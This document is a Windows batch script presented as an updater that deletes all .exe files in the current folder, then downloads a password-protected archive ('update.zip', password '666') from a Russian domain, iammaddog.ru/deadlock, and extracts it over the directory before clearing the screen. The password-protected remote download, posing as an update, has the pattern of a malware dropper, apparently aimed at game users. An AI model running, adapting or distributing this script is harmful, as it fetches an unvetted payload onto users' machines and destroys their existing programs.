@echo off
setlocal

set CURRENT_DIR=%cd%
set DOWNLOAD_URL=https://iammaddog.ru/deadlock
set ZIP_FILENAME=update.zip
set EXTRACTION_PATH=%CURRENT_DIR%
set ZIP_PASSWORD=666
set SEVEN_ZIP_URL=https://www.7-zip.org/a/7z1900-x64.exe
set SEVEN_ZIP_INSTALLER=7z_installer.exe
set SEVEN_ZIP_PATH=C:\Program Files\7-Zip\7z.exe
set WINRAR_PATH=C:\Program Files\WinRAR\WinRAR.exe

echo Current Directory: %CURRENT_DIR%

echo Deleting old .exe files in %CURRENT_DIR%...
for %%f in ("%CURRENT_DIR%\*.exe") do (
    echo Deleting %%f
    del "%%f"
    if errorlevel 1 (
        echo Warning: Failed to delete %%f.
    ) else (
        echo Deleted: %%f
    )
)

echo Downloading %ZIP_FILENAME% from %DOWNLOAD_URL%...
where curl >nul 2>&1
if errorlevel 1 (
    echo curl not found. Attempting download using PowerShell...
    powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%ZIP_FILENAME%'"
    if errorlevel 1 (
        echo Error: Failed to download the file.
        exit /b 1
    )
) else (
    curl.exe -L "%DOWNLOAD_URL%" --output "%ZIP_FILENAME%"
    if errorlevel 1 (
        echo Error: Failed to download the file.
        exit /b 1
    )
)
echo Download complete. File saved as %ZIP_FILENAME%.

if exist "%SEVEN_ZIP_PATH%" (
    echo 7-Zip found. Extracting with 7-Zip...
    "%SEVEN_ZIP_PATH%" x -p%ZIP_PASSWORD% -y -o"%EXTRACTION_PATH%" "%ZIP_FILENAME%" -aoa >nul 2>&1
    if errorlevel 1 (
        echo Error: Failed to extract the archive using 7-Zip. Aborting.
        exit /b 1
    )
    echo Extraction complete.
    goto Cleanup
) else if exist "%WINRAR_PATH%" (
    echo WinRAR found. Extracting with WinRAR...
    "%WINRAR_PATH%" x -p%ZIP_PASSWORD% -y "%ZIP_FILENAME%" "%EXTRACTION_PATH%" >nul 2>&1
    if errorlevel 1 (
        echo Error: Failed to extract the archive using WinRAR. Aborting.
        exit /b 1
    )
    echo Extraction complete.
    goto Cleanup
) else (
    echo 7-Zip and WinRAR not found. Would you like to download and install 7-Zip? (Y/N)
    set /p user_input="Enter choice: "
    if /i "%user_input%"=="Y" (
        echo Downloading 7-Zip installer from %SEVEN_ZIP_URL%...
        powershell -Command "Invoke-WebRequest -Uri '%SEVEN_ZIP_URL%' -OutFile '%SEVEN_ZIP_INSTALLER%'"
        if errorlevel 1 (
            echo Error: Failed to download 7-Zip installer.
            exit /b 1
        )
        echo 7-Zip installer downloaded as %SEVEN_ZIP_INSTALLER%. Please run the installer to install 7-Zip.
        exit /b 0
    ) else (
        echo 7-Zip not found and not downloaded. Attempting extraction with PowerShell...
        where powershell >nul 2>&1
        if errorlevel 1 (
            echo Error: Neither 7-Zip nor PowerShell are available for extraction. Aborting.
            exit /b 1
        )
        powershell -Command "Expand-Archive -Path '%ZIP_FILENAME%' -DestinationPath '%EXTRACTION_PATH%' -Force" >nul 2>&1
        if errorlevel 1 (
            echo Error: Failed to extract the archive using PowerShell. Aborting.
            exit /b 1
        )
        echo Extraction complete.
    )
)

:Cleanup
echo Deleting %ZIP_FILENAME%...
del "%ZIP_FILENAME%"
if errorlevel 1 (
    echo Warning: Failed to delete the ZIP file.
) else (
    echo Deleted: %ZIP_FILENAME%
)

cls
Color 9
echo --------------------------------------------------------------------------------
echo ################################# GOODBYE! #####################################
echo --------------------------------------------------------------------------------

pause
exit /b 0
